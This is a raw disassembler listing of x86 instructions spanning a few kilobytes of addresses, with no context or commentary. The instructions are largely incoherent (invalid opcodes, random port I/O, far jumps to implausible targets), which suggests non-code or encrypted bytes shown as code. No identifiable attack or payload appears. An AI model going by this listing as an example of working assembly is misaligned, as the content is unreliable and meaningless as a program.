  418bfa:	pop    ebp
  418bfb:	addr16 jns 0x418c5e
  418bfe:	dec    ebx
  418bff:	jb     0x418b85
  418c01:	jnp    0x418c39
  418c03:	addr16 dec ebp
  418c05:	addr16 inc esi
  418c07:	jb     0x418c4d
  418c09:	mov    ecx,DWORD PTR [eax+0x6e]
  418c0c:	pop    esp
  418c0d:	jl     0x418c77
  418c0f:	jb     0x418c59
  418c11:	mov    ebp,DWORD PTR [eax+0x3f]
  418c14:	jmp    0x45a4e33c
  418c19:	sbb    eax,0x674c6357
  418c1e:	inc    esi
  418c1f:	jb     0x418c51
  418c21:	das    
  418c22:	pop    ecx
  418c23:	inc    ebp
  418c24:	or     al,0x1b
  418c26:	cmp    BYTE PTR [ecx+0x4],dh
  418c29:	adc    DWORD PTR [esi],edi
  418c2b:	arpl   WORD PTR [eax],dx
  418c2d:	addr16 inc esi
  418c2f:	jb     0x418c41
  418c31:	mulps  xmm0,XMMWORD PTR [ebx+0x1]
	...
  418c41:	add    BYTE PTR [eax],al
  418c43:	add    BYTE PTR [edi],dh
  418c45:	bound  esi,QWORD PTR [edx-0xb]
  418c48:	sub    ebp,DWORD PTR [eax+0x77]
  418c4b:	jmp    0xf9b8e373
  418c50:	sub    al,0x49
  418c52:	arpl   dx,bx
  418c54:	adc    al,0x57
  418c56:	ins    DWORD PTR es:[edi],dx
  418c57:	loopne 0x418c84
  418c59:	push   0x5723e977
  418c5e:	ja     0x418c39
  418c60:	or     al,0x37
  418c62:	arpl   WORD PTR [eax],ax
  418c64:	imul   ebx,DWORD PTR ss:[ebp+0x73],0x1f
  418c69:	inc    ebp
  418c6a:	imul   ebp,DWORD PTR [esi+0xe],0x6b
  418c6e:	js     0x418ce4
  418c70:	cmp    dl,BYTE PTR [esi]
  418c72:	popa   
  418c73:	jbe    0x418c64
  418c75:	xor    eax,0x14e55474
  418c7a:	popa   
  418c7b:	ins    BYTE PTR es:[edi],dx
  418c7c:	fadd   QWORD PTR [edi]
  418c7e:	dec    ebx
  418c7f:	jo     0x418c60
  418c81:	popa   
  418c82:	push   eax
  418c83:	jb     0x418c7a
  418c85:	fs popa 
  418c87:	jae    0x418c22
  418c89:	sbb    al,0x6b
  418c8b:	imul   ebx,edi,0x61
  418c8e:	add    BYTE PTR [ecx-0x79],cl
  418c91:	cmp    BYTE PTR [ecx+0x72],ah
  418c94:	cdq    
  418c95:	bound  ebp,QWORD PTR [esi+0x61]
  418c98:	mov    gs,WORD PTR [esp+ecx*2+0x6f]
  418c9c:	popf   
  418c9d:	push   0x61
  418c9f:	fs inc ebp
  418ca1:	arpl   WORD PTR [ecx+0x73],dx
  418ca4:	das    
  418ca5:	aaa    
  418ca6:	add    BYTE PTR [edi+0x0],al
	...
  418cb5:	add    BYTE PTR [eax],al
  418cb7:	pop    ds
  418cb8:	sub    eax,0x6c216f54
  418cbd:	outs   dx,BYTE PTR ds:[esi]
  418cbe:	dec    ecx
  418cbf:	test   BYTE PTR [ebx+0x6b],ch
  418cc2:	jb     0x418d1b
  418cc4:	push   0x63656974
  418cc9:	add    BYTE PTR [ebx+0x65],al
  418ccc:	arpl   WORD PTR [esi+0x65],si
  418ccf:	dec    eax
  418cd0:	sub    eax,0xd6e694f
  418cd5:	imul   edx,DWORD PTR [ebx-0x72],0x35
  418cd9:	outs   dx,BYTE PTR gs:[esi]
  418cdb:	pop    ebp
  418cdc:	push   ss
  418cdd:	gs cmp ecx,DWORD PTR fs:[ecx]
  418ce1:	dec    esp
  418ce2:	outs   dx,DWORD PTR ds:[esi]
  418ce3:	lods   eax,DWORD PTR ds:[esi]
  418ce4:	pusha  
  418ce5:	outs   dx,BYTE PTR ds:[esi]
  418ce6:	push   ebp
  418ce7:	cdq    
  418ce8:	push   0x72
  418cea:	inc    ecx
  418ceb:	arpl   si,bx
  418ced:	dec    ebp
  418cee:	ins    DWORD PTR es:[edi],dx
  418cef:	hlt    
  418cf0:	(bad)  
  418cf1:	push   esi
  418cf2:	jo     0x418ca7
  418cf4:	mov    gs,WORD PTR [edx+0x76]
  418cf7:	retf   0x66c0
  418cfa:	gs (bad) 
  418cfc:	jb     0x418d60
  418cfe:	ins    BYTE PTR es:[edi],dx
  418cff:	into   
  418d00:	leave  
  418d01:	inc    edx
  418d02:	add    BYTE PTR [edx-0x4f8c9880],ah
  418d08:	js     0x418d3f
  418d0a:	ins    DWORD PTR es:[edi],dx
  418d0b:	mov    eax,0xb1506b81
  418d10:	test   DWORD PTR [ebx+0x67],edx
  418d13:	pop    DWORD PTR [ecx-0x236f9c9c]
  418d19:	add    DWORD PTR [ecx+0x0],esp
	...
  418d28:	add    BYTE PTR [eax],al
  418d2a:	xchg   ecx,eax
  418d2b:	push   ebp
  418d2c:	push   ecx
  418d2d:	je     0x418d7f
  418d2f:	mov    gs,WORD PTR [ebx]
  418d31:	fs (bad) 
  418d33:	cmp    BYTE PTR [ecx+eax*2],al
  418d36:	jle    0x418d66
  418d38:	push   eax
  418d39:	dec    ebp
  418d3a:	jae    0x418d7d
  418d3c:	push   0x51
  418d3e:	push   0x2f
  418d40:	push   eax
  418d41:	arpl   WORD PTR [esi-0x11],cx
  418d44:	dec    edi
  418d45:	ins    DWORD PTR es:[edi],dx
  418d46:	push   ecx
  418d47:	dec    ecx
  418d48:	inc    ebx
  418d49:	add    BYTE PTR [eax],ah
  418d4b:	inc    ecx
  418d4c:	push   esi
  418d4d:	je     0x418d6d
  418d4f:	adc    cl,BYTE PTR [edi+0x6b]
  418d52:	and    BYTE PTR [ecx],al
  418d54:	push   esi
  418d55:	je     0x418da1
  418d57:	or     ch,BYTE PTR [ebx+0x61]
  418d5a:	inc    edx
  418d5b:	lock pop esi
  418d5d:	jno    0x418d79
  418d5f:	shl    BYTE PTR [esi],cl
  418d61:	je     0x418d6f
  418d63:	into   
  418d64:	pusha  
  418d65:	add    BYTE PTR [eax],ah
  418d67:	or     DWORD PTR [esi+0x74],edx
  418d6a:	and    BYTE PTR [eax],cl
  418d6c:	imul   esi,DWORD PTR [ecx-0x2],0xf16d4fee
  418d73:	add    al,0xcc
  418d75:	add    esp,DWORD PTR [edx]
  418d77:	push   edi
  418d78:	loopne 0x418dcd
  418d7a:	test   DWORD PTR [ebx-0x36],0xd95bf054
  418d81:	pusha  
  418d82:	mov    ds:0xbc4fb968,al
  418d87:	imul   edx,eax,0x66
  418d8a:	lods   al,BYTE PTR ds:[esi]
  418d8b:	pop    ecx
  418d8c:	int3   
  418d8d:	xor    eax,DWORD PTR [eax]
	...
  418d9b:	add    BYTE PTR [eax],al
  418d9d:	rcr    DWORD PTR [ebp+esi*4+0x64],1
  418da1:	mov    bh,0x68
  418da3:	mov    dl,0x60
  418da5:	lods   al,BYTE PTR ds:[esi]
  418da6:	add    eax,0x56303e7
  418dab:	out    0x3,eax
  418dad:	arpl   WORD PTR ds:0x56303e7,ax
  418db3:	out    0x3,eax
  418db5:	arpl   WORD PTR ds:0x56303e7,ax
  418dbb:	out    0x3,eax
  418dbd:	arpl   WORD PTR ds:0x56303e7,ax
  418dc3:	out    0x3,eax
  418dc5:	arpl   WORD PTR ds:0x56303e7,ax
  418dcb:	out    0x3,eax
  418dcd:	arpl   WORD PTR ds:0x56303e7,ax
  418dd3:	out    0x3,eax
  418dd5:	arpl   WORD PTR ds:0x56303e7,ax
  418ddb:	out    0x3,eax
  418ddd:	arpl   WORD PTR ds:0x56303e7,ax
  418de3:	out    0x3,eax
  418de5:	arpl   WORD PTR ds:0x56303e7,ax
  418deb:	out    0x3,eax
  418ded:	arpl   WORD PTR ds:0x56303e7,ax
  418df3:	out    0x3,eax
  418df5:	arpl   WORD PTR ds:0x56303e7,ax
  418dfb:	add    cl,ch
  418dfd:	pusha  
  418dfe:	add    eax,0xe900
	...
  418e0f:	add    BYTE PTR [eax+0x5],ah
  418e12:	add    cl,ch
  418e14:	pusha  
  418e15:	add    eax,0x3818e900
  418e1a:	inc    edi
  418e1b:	lods   eax,DWORD PTR ds:[esi]
  418e1c:	pusha  
  418e1d:	dec    esp
  418e1e:	and    ebx,DWORD PTR [ecx]
  418e20:	jg     0x418e4f
  418e22:	sub    ecx,DWORD PTR [edi+ebp*2]
  418e25:	sbb    DWORD PTR [eax+0xc],ebx
  418e28:	adc    BYTE PTR ds:0x247b9134,0x30
  418e2f:	sti    
  418e30:	js     0x418e56
  418e32:	xor    bl,bl
  418e34:	js     0x418e52
  418e36:	and    ebx,ecx
  418e38:	push   esi
  418e39:	sub    eax,0x2d4ed923
  418e3e:	and    ebx,ecx
  418e40:	jbe    0x418e6f
  418e42:	and    edi,DWORD PTR [ecx-0x46dcd292]
  418e48:	jbe    0x418e77
  418e4a:	and    edi,DWORD PTR [ecx-0x1684d292]
  418e50:	mov    eax,ds:0x80377464
  418e55:	pop    ecx
  418e56:	addr16 push edi
  418e58:	mov    WORD PTR [esi],?
  418e5a:	ja     0x418eb6
  418e5c:	xchg   ebx,eax
  418e5d:	imul   esp,DWORD PTR fs:[eax],0x49
  418e61:	ins    DWORD PTR es:[di],dx
  418e63:	jmp    0x4fb3f2af
  418e68:	sub    al,0x61
  418e6a:	xor    ebx,edi
  418e6c:	jp     0x418ed7
  418e6e:	ins    BYTE PTR es:[edi],dx
  418e6f:	cmp    eax,0x3e714867
	...
  418e80:	add    BYTE PTR [eax],al
  418e82:	add    BYTE PTR [edx+0x5a],cl
  418e85:	ss aad 0x70
  418e88:	push   ebx
  418e89:	ins    DWORD PTR es:[edi],dx
  418e8a:	or     al,BYTE PTR [esi+edx*2]
  418e8d:	jno    0x418e78
  418e8f:	push   edi
  418e90:	bound  esp,QWORD PTR [esi+0x0]
  418e93:	xchg   esi,eax
  418e94:	xor    eax,0xd67725d
  418e99:	inc    esi
  418e9a:	popa   
  418e9b:	mov    BYTE PTR [eax],bl
  418e9d:	push   eax
  418e9e:	ins    BYTE PTR es:[edi],dx
  418e9f:	ja     0x418f06
  418ea1:	outs   dx,BYTE PTR gs:[esi]
  418ea3:	cdq    
  418ea4:	sbb    BYTE PTR [esi+0x54],al
  418ea7:	stos   BYTE PTR es:[edi],al
  418ea8:	sbb    BYTE PTR [eax+0x6f],cl
  418eab:	mov    DWORD PTR [eax+0x6f],eax
  418eae:	add    BYTE PTR [ecx],bl
  418eb0:	pop    ebp
  418eb1:	data16 je 0x418ec9
  418eb4:	arpl   WORD PTR [edx+0x65],si
  418eb7:	out    dx,al
  418eb8:	inc    ebp
  418eb9:	pop    ebp
  418eba:	jb     0x418f04
  418ebc:	sbb    BYTE PTR [eax+0x6c],dl
  418ebf:	mul    DWORD PTR [ebp+eiz*2+0x6e]
  418ec3:	fst    DWORD PTR [edi]
  418ec5:	inc    esi
  418ec6:	push   esp
  418ec7:	jmp    0x6f3f:0xc96f4817
  418ece:	add    cl,bl
  418ed0:	pop    esp
  418ed1:	data16 je 0x418e69
  418ed4:	arpl   WORD PTR [edx+0x65],si
  418ed7:	out    dx,al
  418ed8:	inc    ebp
  418ed9:	pop    ebp
  418eda:	jb     0x418eca
  418edc:	sbb    BYTE PTR [ebp+0x76],bl
  418edf:	out    0x2f,eax
  418ee1:	inc    esp
  418ee2:	imul   ebp,DWORD PTR [ebx+0x676b5d],0x0
	...
  418ef4:	add    BYTE PTR [eax],al
  418ef6:	xor    bl,BYTE PTR [edi+ebp*2+0x74]
  418efa:	popf   
  418efb:	aaa    
  418efc:	jne    0x418f5a
  418efe:	test   BYTE PTR ds:0x3a2d4850,dl
  418f04:	je     0x418f06
  418f06:	imul   ebx,DWORD PTR [esi+0x66],0x72648574
  418f0d:	outs   dx,BYTE PTR gs:[esi]
  418f0f:	inc    ebx
  418f10:	pop    ebp
  418f11:	jb     0x418eab
  418f13:	pop    ss
  418f14:	dec    edi
  418f15:	popa   
  418f16:	push   esp
  418f17:	xor    BYTE PTR [esp+eax*2+0x63],ah
  418f1b:	add    eax,0x70c6c61
  418f20:	dec    esp
  418f21:	addr16 adc dl,dl
  418f24:	push   0x41f20a72
  418f29:	push   esp
  418f2a:	xor    esp,DWORD PTR [esi]
  418f2c:	addr16 jno 0x418f26
  418f2f:	fnsave [ecx]
  418f31:	pop    edi
  418f32:	lock stos BYTE PTR es:[edi],al
  418f34:	push   eax
  418f35:	ins    DWORD PTR es:[edi],dx
  418f36:	icebp  
  418f37:	leave  
  418f38:	add    DWORD PTR [eax-0xc],ecx
  418f3b:	stos   BYTE PTR es:[edi],al
  418f3c:	dec    ebp
  418f3d:	dec    esi
  418f3e:	ret    0x5e91
  418f41:	add    BYTE PTR [esi+0x63725e8b],ch
  418f47:	mov    al,ds:0xdcbe6e6a
  418f4c:	push   eax
  418f4d:	popa   
  418f4e:	mov    ebx,0xb3745f7f
  418f53:	mov    dh,0x6a
  418f55:	outs   dx,BYTE PTR ds:[esi]
  418f56:	mov    edx,0x4535dc
	...
  418f67:	add    BYTE PTR [eax],al
  418f69:	fwait
  418f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f6b:	xor    al,0x4c
  418f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f6e:	mov    al,BYTE PTR [ecx]
  418f70:	inc    edi
  418f71:	test   DWORD PTR [ebx+0x4d],ecx
  418f74:	pop    edi
  418f75:	jg     0x418ef7
  418f77:	cmp    eax,0x3fdc9167
  418f7c:	je     0x418ff1
  418f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f7f:	addr16 movs DWORD PTR es:[di],DWORD PTR ds:[si]
  418f82:	cmp    eax,0xb636367
  418f87:	outs   dx,WORD PTR gs:[esi]
  418f8a:	das    
  418f8b:	arpl   WORD PTR [edx+0x46],si
  418f8e:	and    BYTE PTR ds:0x680b4a68,bh
  418f94:	arpl   WORD PTR [ecx-0x10],dx
  418f97:	sub    al,0x67
  418f99:	xor    eax,0x30756540
  418f9e:	cld    
  418f9f:	inc    eax
  418fa0:	ins    DWORD PTR es:[edi],dx
  418fa1:	inc    esi
  418fa2:	add    eax,0x693d6514
  418fa7:	add    al,0x52
  418fa9:	arpl   WORD PTR [edx],si
  418fab:	push   es
  418fac:	pop    esi
  418fad:	pop    ss
  418fae:	push   esi
  418faf:	or     BYTE PTR [edx+0x0],dl
  418fb2:	xor    DWORD PTR [esi],ebp
  418fb4:	ins    BYTE PTR es:[edi],dx
  418fb5:	add    al,0x52
  418fb7:	or     esp,DWORD PTR [ecx+0x11]
  418fba:	xor    DWORD PTR [ebx],ebx
  418fbc:	mul    DWORD PTR [bp+di-0x5]
  418fc0:	and    esp,DWORD PTR [edx]
  418fc2:	pop    esi
  418fc3:	aam    0x68
  418fc5:	or     al,0x5f
  418fc7:	ret    
  418fc8:	pusha  
  418fc9:	icebp  
  418fca:	add    al,0xb3
  418fcc:	dec    esp
	...
  418fd9:	add    BYTE PTR [eax],al
  418fdb:	add    bl,dl
  418fdd:	push   edx
  418fde:	(bad)  
  418fdf:	ins    BYTE PTR es:[edi],dx
  418fe0:	iret   
  418fe1:	(bad)  
  418fe2:	iret   
  418fe3:	add    esi,DWORD PTR [edx-0x2d9f4ca4]
  418fe9:	xor    edi,esp
  418feb:	aaa    
  418fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fed:	push   ebp
  418fee:	mov    edx,0x8a59bc4e
  418ff3:	imul   ecx,DWORD PTR [edi-0x62c945ca],0x39
  418ffa:	mov    bh,0x3
  418ffc:	mov    edi,0x45658056
  419001:	pop    esp
  419002:	xchg   ebp,eax
  419003:	ins    BYTE PTR es:[edi],dx
  419004:	arpl   WORD PTR [edi],bx
  419006:	nop
  419007:	gs jl  0x41900f
  41900a:	sahf   
  41900b:	xor    bl,BYTE PTR [esi+0x63339347]
  419011:	dec    ecx
  419012:	xor    BYTE PTR [edx],dh
  419014:	arpl   WORD PTR [ecx+0x24],cx
  419017:	ds lahf 
  419019:	cmp    al,0x39
  41901b:	add    al,0x22
  41901d:	cmp    BYTE PTR [ebx],dh
  41901f:	inc    ecx
  419020:	sbb    eax,0x1c041739
  419025:	inc    edx
  419026:	das    
  419027:	ins    DWORD PTR es:[edi],dx
  419028:	push   edx
  419029:	pop    ecx
  41902a:	add    BYTE PTR [esi+0x11],al
  41902d:	push   esi
  41902e:	add    BYTE PTR [edx],bl
  419030:	cmp    al,0x67
  419032:	je     0x419052
  419034:	inc    esi
  419035:	push   ebx
  419036:	arpl   WORD PTR ds:0xb6d6164,di
  41903c:	push   es
  41903d:	popa   
  41903e:	push   ecx
  41903f:	sub    al,BYTE PTR [eax]
	...
  41904d:	add    BYTE PTR [eax],al
  41904f:	push   ds
  419050:	xor    eax,0x52202543
  419055:	je     0x41905b
  419057:	inc    ebp
  419058:	cmp    DWORD PTR [eax-0x37],edx
  41905b:	outs   dx,BYTE PTR ds:[esi]
  41905c:	and    eax,0x620bfe48
  419061:	pop    esp
  419062:	mov    eax,0xce6d3921
  419067:	cld    
  419068:	bound  ebx,QWORD PTR [edi-0x25]
  41906b:	pusha  
  41906c:	ss ins DWORD PTR es:[edi],dx
  41906e:	(bad)  
  41906f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419070:	push   edx
  419071:	pop    edi
  419072:	mov    ebx,0xcd4529c3
  419077:	mov    ebp,0x71c55f67
  41907c:	inc    esi
  41907d:	aas    
  41907e:	cdq    
  41907f:	mov    ds:0x9c9c4129,eax
  419084:	push   0x2570b546
  419089:	ss leave 
  41908b:	push   eax
  41908c:	push   edi
  41908d:	ins    DWORD PTR es:[edi],dx
  41908e:	xchg   DWORD PTR [ebx-0x7a6f8eaa],eax
  419094:	pop    ebx
  419095:	pop    edi
  419096:	lea    ecx,[esp+edi*1+0x41]
  41909a:	popf   
  41909b:	test   DWORD PTR [edx+0x6c],ebx
  41909e:	mov    edi,DWORD PTR [edi+0x57]
  4190a1:	add    BYTE PTR [edx],bh
  4190a3:	xchg   BYTE PTR [ebx+0x74],ah
  4190a6:	push   esi
  4190a7:	adc    BYTE PTR [edi+0x63],0x35
  4190ab:	sahf   
  4190ac:	pop    ecx
  4190ad:	ins    DWORD PTR es:[edi],dx
  4190ae:	dec    ebx
  4190af:	inc    eax
  4190b0:	pop    ecx
  4190b1:	push   ecx
	...
  4190c2:	jns    0x41910c
  4190c4:	push   eax
  4190c5:	inc    ebp
  4190c6:	inc    si
  4190c8:	jno    0x41913e
  4190ca:	das    
  4190cb:	or     edx,DWORD PTR [eax+edx*2+0x6a]
  4190cf:	cli    
  4190d0:	pop    ds
  4190d1:	dec    eax
  4190d2:	push   ebp
  4190d3:	fs popa 
  4190d5:	pop    esp
  4190d6:	imul   eax,DWORD PTR [esi+0x54],0x6f
  4190da:	gs pop ebp
  4190dc:	bound  esp,QWORD PTR [ecx+0x78]
  4190df:	add    DWORD PTR [edi+0x6f],ecx
  4190e2:	pop    esp
  4190e3:	xor    eax,0x2b886173
  4190e8:	pop    esp
  4190e9:	inc    edi
  4190ea:	bound  sp,DWORD PTR [edx+0x61]
  4190ee:	jbe    0x419105
  4190f0:	aas    
  4190f1:	inc    ecx
  4190f2:	stos   BYTE PTR es:[edi],al
  4190f3:	or     ebx,DWORD PTR [ebx+eax*2-0x71]
  4190f7:	cmp    al,0x61
  4190f9:	inc    esi
  4190fa:	push   ds
  4190fb:	sbb    BYTE PTR [eax],ah
  4190fd:	aaa    
  4190fe:	push   0x11
  419100:	jb     0x419171
  419102:	sbb    al,0x2b
  419104:	outs   dx,DWORD PTR ds:[esi]
  419105:	jae    0x41913a
  419107:	popa   
  419108:	outs   dx,BYTE PTR ds:[esi]
  419109:	popa   
  41910a:	es adc al,0x4d
  41910d:	inc    ebx
  41910e:	into   
  41910f:	pusha  
  419110:	imul   ebp,DWORD PTR [eax+ebx*8+0x66],0x72
  419115:	add    cl,ch
  419117:	pusha  
  419118:	data16 je 0x419118
  41911b:	data16 jb 0x419183
  41911e:	(bad)  
  41911f:	or     BYTE PTR [edi+ebp*2-0x28],ch
  419123:	data16 ins BYTE PTR es:[edi],dx
  419125:	push   ebx
	...
  419132:	add    BYTE PTR [eax],al
  419134:	add    BYTE PTR [ecx-0x29baafba],bh
  41913a:	inc    esp
  41913b:	jno    0x4191b1
  41913d:	fisttp WORD PTR [ecx]
  41913f:	push   esp
  419140:	push   eax
  419141:	pop    edx
  419142:	jmp    0x64d6d966
  419147:	popa   
  419148:	pop    esp
  419149:	arpl   WORD PTR ds:0xb44543f,cx
  41914f:	push   0x4104262
  419154:	push   ecx
  419155:	xor    al,0x44
  419157:	push   eax
  419158:	jne    0x41919c
  41915a:	adc    BYTE PTR [ebp+0x5c],bl
  41915d:	sbb    al,0xa
  41915f:	arpl   WORD PTR [edx+0x42],sp
  419162:	repnz cs inc ecx
  419165:	and    cl,BYTE PTR [esi]
  419167:	cmp    eax,0x4fe9205c
  41916c:	arpl   WORD PTR ds:0x4b203412,bx
  419172:	mov    esi,0x3f47231
  419177:	pop    ebp
  419178:	jno    0x41916a
  41917a:	add    al,0x63
  41917c:	outs   dx,BYTE PTR ds:[esi]
  41917d:	add    cl,dl
  41917f:	xor    eax,0x648a204f
  419184:	ins    DWORD PTR es:[edi],dx
  419185:	idiv   DWORD PTR [edi-0x6f9c8d9e]
  41918b:	cmp    al,0x6c
  41918d:	les    edi,FWORD PTR [esi-0x604f939e]
  419193:	inc    edx
  419194:	push   eax
  419195:	sahf   
  419196:	push   0x7340
	...
  4191a7:	add    BYTE PTR [edi-0x6cabc447],dh
  4191ad:	fdiv   QWORD PTR ds:0x5f73bf45
  4191b3:	pop    edi
  4191b4:	mov    bh,0x8f
  4191b6:	inc    eax
  4191b7:	aas    
  4191b8:	mov    bl,0x99
  4191ba:	xor    eax,0x5e708e41
  4191bf:	inc    esi
  4191c0:	mov    bh,0x6c
  4191c2:	and    DWORD PTR [eax-0x6f],edx
  4191c5:	jnp    0x4191c8
  4191c7:	pop    esp
  4191c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191c9:	and    BYTE PTR [edx+eiz*2-0x7e],0x48
  4191ce:	xor    BYTE PTR [ecx-0x5e],al
  4191d1:	add    eax,0x46874937
  4191d6:	push   esp
  4191d7:	pop    eax
  4191d8:	inc    eax
  4191d9:	inc    ebx
  4191da:	cmp    esi,DWORD PTR [ebx+eax*4]
  4191dd:	cmp    DWORD PTR [eax+0x58],eax
  4191e0:	inc    eax
  4191e1:	add    eax,0x51504723
  4191e6:	inc    esp
  4191e7:	dec    edx
  4191e8:	pop    ss
  4191e9:	xor    eax,0x58322fe7
  4191ee:	std    
  4191ef:	addr16 or al,0x51
  4191f2:	out    0x36,eax
  4191f4:	arpl   WORD PTR ss:[ebx],dx
  4191f7:	pop    ebx
  4191f8:	cmp    al,0x57
  4191fa:	or     al,0x30
  4191fc:	sbb    eax,0xfb570859
  419201:	inc    edx
  419202:	pop    ds
  419203:	xor    al,0x27
  419205:	push   ss
  419206:	out    0x36,eax
  419208:	push   cs
  419209:	arpl   bx,di
  41920b:	pop    edx
	...
  419218:	add    BYTE PTR [eax],al
  41921a:	add    BYTE PTR [edi+edx*2],dl
  41921d:	add    al,0x30
  41921f:	and    eax,0xfb56c859
  419224:	inc    edx
  419225:	mov    edi,0xc6366333
  41922a:	imul   ecx,edi,0xc055c852
  419230:	sub    DWORD PTR [ebp-0x30a95ba1],ebp
  419236:	dec    ecx
  419237:	fwait
  419238:	xor    eax,0x3c631793
  41923d:	mov    ebp,0x9364b756
  419242:	pop    edi
  419243:	rcl    BYTE PTR [edi-0x5d],0x64
  419247:	xchg   edi,eax
  419248:	pop    ebp
  419249:	mov    bh,0x64
  41924b:	(bad)  
  41924c:	pop    ebp
  41924d:	out    0x53,eax
  41924f:	lods   al,BYTE PTR ds:[esi]
  419250:	push   ecx
  419251:	pop    DWORD PTR [ebx]
  419253:	pushf  
  419254:	pop    ebx
  419255:	jp     0x4192ae
  419257:	pushf  
  419258:	pop    ecx
  419259:	add    BYTE PTR [ebp+0x755f3540],al
  41925f:	mov    BYTE PTR ds:0x2a8b4844,al
  419265:	inc    esi
  419266:	dec    esi
  419267:	inc    ebx
  419268:	popa   
  419269:	arpl   WORD PTR [ebx+0x5f],bx
  41926c:	sub    DWORD PTR [ecx+0x40],edx
  41926f:	sub    esp,DWORD PTR [esi+0x71]
  419272:	pop    ss
  419273:	cmp    ebp,DWORD PTR [edx]
  419275:	je     0x419260
  419277:	mov    WORD PTR [edx],?
  419279:	jae    0x4192bb
  41927b:	cmp    al,0x5c
  41927d:	cs inc ebp
	...
  41928b:	add    BYTE PTR [eax],al
  41928d:	add    BYTE PTR [esi+0x51],al
  419290:	add    BYTE PTR [ebp+0x67],al
  419293:	bound  esi,QWORD PTR [ecx+0x15]
  419296:	add    BYTE PTR [edi+0x77],dl
  419299:	(bad)  
  41929a:	cld    
  41929b:	sub    DWORD PTR [ecx+ebp*8+0x3c],esi
  41929f:	inc    ebx
  4192a0:	ins    BYTE PTR es:[edi],dx
  4192a1:	or     BYTE PTR [ebx*2+0x29372146],ch
  4192a8:	xor    ecx,ebp
  4192aa:	inc    esp
  4192ab:	inc    ebx
  4192ac:	ins    BYTE PTR es:[edi],dx
  4192ad:	or     BYTE PTR [ebx*2+0x2930c146],dl
  4192b4:	xor    al,0xe9
  4192b6:	mov    WORD PTR [edi],?
  4192b8:	(bad)
  4192bc:	addr16 mov ebp,0xa50028ac
  4192c2:	lods   eax,DWORD PTR ds:[esi]
  4192c3:	pusha  
  4192c4:	je     0x41928a
  4192c6:	ret    
  4192c7:	sub    BYTE PTR [esi-0x38],ch
  4192ca:	leave  
  4192cb:	fs jb  0x4192cd
  4192ce:	cwde   
  4192cf:	pop    esp
  4192d0:	ins    BYTE PTR es:[edi],dx
  4192d1:	jmp    0x8aa4e64a
  4192d6:	mov    edx,DWORD PTR [edi+0x74]
  4192d9:	call   0x56b6:0x8476538b
  4192e0:	cs add dl,ah
  4192e3:	gs ins BYTE PTR es:[edi],dx
  4192e5:	add    dh,bl
  4192e7:	pop    esi
  4192e8:	gs ins BYTE PTR es:[edi],dx
  4192ea:	out    0x3a,eax
  4192ec:	gs ins BYTE PTR es:[edi],dx
  4192ee:	outs   dx,BYTE PTR ds:[esi]
  4192ef:	popa   
  4192f0:	cs js  0x4192f3
	...
  4192ff:	add    BYTE PTR [eax],al
  419301:	(bad)  
  419302:	add    BYTE PTR gs:[ebx+0x2d],dl
  419306:	pop    ebx
  419307:	je     0x419380
  419309:	sub    ebp,DWORD PTR [edi]
  41930b:	popa   
  41930c:	pop    esp
  41930d:	test   BYTE PTR [esp+ebp*2],ch
  419310:	sub    BYTE PTR gs:[esp+ebp*2],0x6c
  419315:	sub    eax,DWORD PTR [ecx]
  419317:	dec    edi
  419318:	outs   dx,DWORD PTR ds:[esi]
  419319:	and    al,0x2d
  41931b:	jae    0x41937e
  41931d:	push   0x53465c60
  419322:	gs popa 
  419324:	pop    edx
  419325:	jae    0x41938c
  419327:	ins    BYTE PTR es:[edi],dx
  419328:	popa   
  419329:	stos   BYTE PTR es:[edi],al
  41932a:	inc    ecx
  41932b:	ins    BYTE PTR es:[edi],dx
  41932c:	imul   esp,DWORD PTR [edi+0x63],0x63530074
  419333:	outs   dx,DWORD PTR ds:[esi]
  419334:	je     0x4193a1
  419336:	gs ins BYTE PTR es:[edi],dx
  419338:	pop    edi
  419339:	inc    esi
  41933a:	sub    al,0x72
  41933c:	add    BYTE PTR [edx+0x66],al
  41933f:	outs   dx,DWORD PTR ds:[esi]
  419340:	je     0x4193bc
  419342:	movq   mm4,QWORD PTR [ebp+0x38]
  419346:	add    al,0x50
  419348:	popa   
  419349:	cmp    DWORD PTR [ecx],esi
  41934b:	add    BYTE PTR [eax+0xd],dl
  41934e:	xor    dh,BYTE PTR [eax+eax*1-0x18]
  419352:	pop    esi
  419353:	imul   ebp,DWORD PTR [edi-0xa],0x2344205e
  41935a:	xor    al,BYTE PTR [eax]
  41935c:	push   ebx
  41935d:	daa    
  41935e:	xor    dh,BYTE PTR [esi+0x65]
  419361:	enter  0x5423,0x79
	...
  419371:	add    BYTE PTR [eax],al
  419373:	add    dl,bh
  419375:	pop    esi
  419376:	add    BYTE PTR [ebx+0x63],dl
  419379:	jns    0x4193ce
  41937b:	jbe    0x419303
  41937d:	ins    BYTE PTR es:[edi],dx
  41937e:	pop    ds
  41937f:	dec    eax
  419380:	je     0x4193cd
  419382:	push   ebp
  419383:	add    BYTE PTR [eax+0x7e765381],dl
  419389:	dec    esp
  41938a:	pop    ds
  41938b:	push   ebx
  41938c:	jo     0x41930f
  41938e:	push   ebx
  41938f:	add    BYTE PTR [eax+0x46765639],dl
  419395:	sub    al,0x22
  419397:	push   eax
  419398:	inc    edx
  419399:	sub    edx,DWORD PTR [ebx+0x0]
  41939c:	xor    BYTE PTR [ecx+0x56],al
  41939f:	jbe    0x4193df
  4193a1:	or     al,0x22
  4193a3:	push   eax
  4193a4:	dec    esp
  4193a5:	or     al,0x58
  4193a7:	add    BYTE PTR [ebx],dl
  4193a9:	cmp    eax,0xeb636858
  4193ae:	fs jb  0x4193de
  4193b1:	stc    
  4193b2:	push   ebp
  4193b3:	push   esp
  4193b4:	sbb    ch,dh
  4193b6:	add    BYTE PTR fs:[edi],ah
  4193b9:	std    
  4193ba:	push   edx
  4193bb:	je     0x419400
  4193bd:	or     esp,DWORD PTR [ebp+0x72]
  4193c0:	or     eax,0x2b2055f9
  4193c5:	not    DWORD PTR [edx+0x74]
  4193c8:	arpl   WORD PTR [edx],sp
  4193ca:	popa   
  4193cb:	jno    0x4193c4
  4193cd:	mov    ebp,0xa7f16334
  4193d2:	data16 jb 0x419358
  4193d5:	xchg   ecx,eax
  4193d6:	push   esp
  4193d7:	arpl   WORD PTR [eax],ax
	...
